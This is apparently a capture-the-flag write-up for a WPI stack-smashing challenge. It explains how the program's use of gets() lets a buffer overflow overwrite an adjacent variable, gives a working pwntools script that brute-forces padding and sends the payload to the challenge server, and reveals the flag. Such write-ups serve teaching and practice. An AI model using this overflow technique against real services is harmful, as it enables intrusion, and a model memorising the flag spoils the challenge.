#### Challenge:

Simple stack smashing challenge

Connect on nc smash184384.wpictf.xyz 15724.

Press enter once after connecting

[challenge.c](./challenge.c ":ignore")

---

#### Solution:

We are given `C` source code which quite obviously wants us to rewrite value of variable we don't have access to (`specialInt`), but which is luckily positioned on the stack below the buffer we are able to overflow thanks to the usage of the `gets` function.

```python
#!/usr/bin/env python

from pwn import *
import struct

for i in range(10,30):
    try:    
        r = remote('smash184384.wpictf.xyz', 15724)

        payload = b'A'*i +  struct.pack('<I',923992130)

        print(payload)
        r.sendline(payload)

        print(r.recvline().decode('utf-8').strip())
        r.close()
    except:
        pass
```

---

<details><summary>FLAG:</summary>

```
WPI{ju5t!n|$bR#4tht4k!n6}
```

</details>
<br/>
